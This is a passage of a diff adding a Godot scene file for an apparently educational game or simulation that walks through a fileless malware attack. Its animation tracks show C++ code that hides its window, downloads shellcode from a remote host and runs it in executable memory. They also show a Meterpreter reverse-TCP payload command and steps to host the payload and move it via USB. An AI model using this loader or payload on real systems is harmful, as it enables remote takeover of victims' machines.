+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 1.615)]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.845, 1.65)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["This group of lines converts the downloaded text into bytes in memory"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["#include <iostream>
+#include <cpr/cpr.h>
+#include <windows.h>
+
+int main() {
+	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
+	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });
+	char* memBuffer = NULL;
+	memBuffer = (char *)r.text.c_str(); 
+	
+	unsigned char shellcode[382]; // This is the size of shellcode 
+	memBuffer += 2; 
+	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
+		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
+		memBuffer = memBuffer + 4;
+	}"]
+}
+
+[sub_resource type="Animation" id="Animation_stl7w"]
+resource_name = "fileless_boilerplate_6"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["#include <iostream>
+#include <cpr/cpr.h>
+#include <windows.h>
+
+int main() {
+	 ::ShowWindow(::GetConsoleWindow(), SW_HIDE); // SW_SHOW;
+	cpr::Response r = cpr::Get(cpr::Url{ \"http://192.168.29.208/home\" });
+	char* memBuffer = NULL;
+	memBuffer = (char *)r.text.c_str(); 
+	
+	unsigned char shellcode[382]; // This is the size of shellcode 
+	memBuffer += 2; 
+	for (size_t count = 0; count < sizeof shellcode - 1; count++) { 
+		sscanf_s(memBuffer, \"%02hhx\", &shellcode[count]); 
+		memBuffer = memBuffer + 4;
+	}
+
+	void* exec = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, 
+ PAGE_EXECUTE_READWRITE);
+    memcpy(exec, shellcode, sizeof shellcode);
+    ((void(*)())exec)();
+}"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 2.8)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.845, 1.075)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Reserves memory that can run code, copies the shellcode, and runs it immediately.
+
+Lets create our silent program and proceed to the next step"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit:scroll_vertical")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [3.0]
+}
+
+[sub_resource type="Animation" id="Animation_1u14y"]
+resource_name = "fileless_boilerplate_7"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/RansomwareApp:value")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/HBoxContainer/Title:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Creating boilerplate application"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window/Label:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Creating program...", "Program created!!!"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Let's wait...", "Program created, let's check it in our desktop"]
+}
+
+[sub_resource type="Animation" id="Animation_32id3"]
+resource_name = "fileless_boilerplate_open"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Desktop/WindowContainer/Label:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["This is our silent program, nothing will show if we open it"]
+}
+
+[sub_resource type="Animation" id="Animation_dffuk"]
+resource_name = "fileless_mydrive_boilerplate"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Desktop/WindowContainer/move to usb:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Desktop/WindowContainer/move to usb/RansomwareApp:value")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Desktop/WindowContainer/Label:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["", "File copied!!! Let's proceed to next step"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Desktop/WindowContainer/move to usb/Label:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Copying to Flashdrive...", "boilerplate.exe copied to Flashdrive!!!"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Desktop/Desktop/MyDriveIcon/Button:disabled")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(1),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Desktop/Desktop/TerminalIcon/Button:disabled")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(1),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
+[sub_resource type="Animation" id="Animation_xpgrc"]
+resource_name = "fileless_mydrive_shellcode"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Desktop/WindowContainer/move to usb:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Desktop/WindowContainer/move to usb/RansomwareApp:value")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 0,
+"values": [0.0, 100.0]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Desktop/WindowContainer/Label:text")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["", "File copied!!! Let's proceed to next step"]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Desktop/WindowContainer/move to usb/Label:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Copying to Flashdrive...", "shellcode.txt copied to Flashdrive!!!"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Desktop/Desktop/MyDriveIcon/Button:disabled")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(1),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Desktop/Desktop/TerminalIcon/Button:disabled")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(1),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
+[sub_resource type="Animation" id="Animation_c6f2f"]
+resource_name = "fileless_shellcode_open"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Desktop/WindowContainer/shellcode_txt:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+
+[sub_resource type="Animation" id="Animation_g7hxf"]
+resource_name = "fileless_show_created_application"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Desktop:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Desktop/WindowContainer/move to usb:visible")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Desktop/WindowContainer/shellcode_txt:visible")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Desktop/WindowContainer/Label:text")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Great! The application has now been created as seen here, Let's copy it into our flashdrive"]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Desktop/WindowContainer:visible")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Desktop/Desktop/shellcode:visible")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("Desktop/Desktop/MyDriveIcon/Button:disabled")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("Desktop/Desktop/TerminalIcon/Button:disabled")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("Desktop/WindowContainer/Label:visible")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/10/type = "value"
+tracks/10/imported = false
+tracks/10/enabled = true
+tracks/10/path = NodePath("Desktop/Desktop/boilerplate:visible")
+tracks/10/interp = 1
+tracks/10/loop_wrap = true
+tracks/10/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+
+[sub_resource type="Animation" id="Animation_n6wwr"]
+resource_name = "fileless_show_created_file"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless:visible")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Desktop:visible")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Desktop/WindowContainer/move to usb:visible")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Desktop/WindowContainer/shellcode_txt:visible")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Desktop/WindowContainer/Label:text")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Great! The file has now been created as seen here, Let's copy it into our flashdrive"]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("Desktop/WindowContainer:visible")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("Desktop/Desktop/shellcode:visible")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/7/type = "value"
+tracks/7/imported = false
+tracks/7/enabled = true
+tracks/7/path = NodePath("Desktop/Desktop/MyDriveIcon/Button:disabled")
+tracks/7/interp = 1
+tracks/7/loop_wrap = true
+tracks/7/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/8/type = "value"
+tracks/8/imported = false
+tracks/8/enabled = true
+tracks/8/path = NodePath("Desktop/Desktop/TerminalIcon/Button:disabled")
+tracks/8/interp = 1
+tracks/8/loop_wrap = true
+tracks/8/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/9/type = "value"
+tracks/9/imported = false
+tracks/9/enabled = true
+tracks/9/path = NodePath("Desktop/WindowContainer/Label:visible")
+tracks/9/interp = 1
+tracks/9/loop_wrap = true
+tracks/9/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+
+[sub_resource type="Animation" id="Animation_1j6a3"]
+resource_name = "fileless_terminal_1"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(-0.5),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["Let's first create the payload"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("HSplitContainer/CodeEdit:text")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(-0.533333),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [""]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:visible")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(-1),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("HSplitContainer/CodeEdit/Overlay:visible")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+
+[sub_resource type="Animation" id="Animation_8rtlk"]
+resource_name = "fileless_terminal_2"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["This command is asking Metasploit’s payload maker to create a special program for Windows that will secretly call back to my computer’s IP and port. I’m telling it my IP  and the port number so it knows where to connect. I’m also saying it’s for Windows, it should work on 32-bit processors , and the output should look like C programming code. Finally, I want it saved in a file called shellcode.txt so I can use it later."]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:modulate")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Color(1, 1, 1, 1)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("HSplitContainer/HFlowContainer/Buttons/Back:disabled")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("HSplitContainer/CodeEdit:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
+<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
+--arch x86 -f c -o shellcode.txt"]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("HSplitContainer/CodeEdit/Overlay:visible")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [true]
+}
+tracks/5/type = "value"
+tracks/5/imported = false
+tracks/5/enabled = true
+tracks/5/path = NodePath("HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/5/interp = 1
+tracks/5/loop_wrap = true
+tracks/5/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.24, 0.6)]
+}
+tracks/6/type = "value"
+tracks/6/imported = false
+tracks/6/enabled = true
+tracks/6/path = NodePath("HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/6/interp = 1
+tracks/6/loop_wrap = true
+tracks/6/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 0.045)]
+}
+
+[sub_resource type="Animation" id="Animation_15poh"]
+resource_name = "fileless_terminal_3"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["You didn’t type --platform windows, but because your payload (windows/meterpreter/reverse_tcp) is clearly for Windows, msfvenom guessed and set it to Windows automatically."]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.115, 0.815)]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(3.24, 0.45)]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("HSplitContainer/CodeEdit:text")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
+<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
+--arch x86 -f c -o shellcode.txt
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows 
+from the payload"]
+}
+
+[sub_resource type="Animation" id="Animation_o4fi6"]
+resource_name = "fileless_terminal_4"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["You didn’t type --arch x86, but your chosen payload works on 32-bit (x86) systems, so msfvenom picked that for you."]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
+<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
+--arch x86 -f c -o shellcode.txt
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows 
+from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+"]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
+tracks/2/path = NodePath("Fileless/HSplitContainer/CodeEdit/shellcode_generated_window:visible")
+tracks/2/interp = 1
+tracks/2/loop_wrap = true
+tracks/2/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": [false]
+}
+tracks/3/type = "value"
+tracks/3/imported = false
+tracks/3/enabled = true
+tracks/3/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_position")
+tracks/3/interp = 1
+tracks/3/loop_wrap = true
+tracks/3/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(0.13, 1.245)]
+}
+tracks/4/type = "value"
+tracks/4/imported = false
+tracks/4/enabled = true
+tracks/4/path = NodePath("Fileless/HSplitContainer/CodeEdit/Overlay:material:shader_parameter/hole_size")
+tracks/4/interp = 1
+tracks/4/loop_wrap = true
+tracks/4/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 0,
+"values": [Vector2(2.73, 0.41)]
+}
+
+[sub_resource type="Animation" id="Animation_5bo41"]
+resource_name = "fileless_terminal_5"
+tracks/0/type = "value"
+tracks/0/imported = false
+tracks/0/enabled = true
+tracks/0/path = NodePath("Fileless/HSplitContainer/CodeEdit:text")
+tracks/0/interp = 1
+tracks/0/loop_wrap = true
+tracks/0/keys = {
+"times": PackedFloat32Array(0),
+"transitions": PackedFloat32Array(1),
+"update": 1,
+"values": ["root@cali :~ # msfpoison -p windows/meterpreter/reverse_tcp LHOST=
+<C&C Server IP Address>  LPORT=<C&C Server Port> --platform windowds 
+--arch x86 -f c -o shellcode.txt
+
+[-] No platform was selected, choosing Msf::Module::Platform::Windows 
+from the payload
+[-] No arch selected, selecting arch: x86 from the payload
+No encoder or badchars specified, outputting raw payload
+Payload size: 333 bytes
+Saved as: shellcode.txt"]
+}
+tracks/1/type = "value"
+tracks/1/imported = false
+tracks/1/enabled = true
+tracks/1/path = NodePath("Fileless/HSplitContainer/HFlowContainer/RichTextLabel:text")
+tracks/1/interp = 1
+tracks/1/loop_wrap = true
+tracks/1/keys = {
+"times": PackedFloat32Array(0, 1),
+"transitions": PackedFloat32Array(1, 1),
+"update": 1,
+"values": ["Let's wait", "Payload created, now let's host it in apache. Let's check if the file was created"]
+}
+tracks/2/type = "value"
+tracks/2/imported = false
+tracks/2/enabled = true
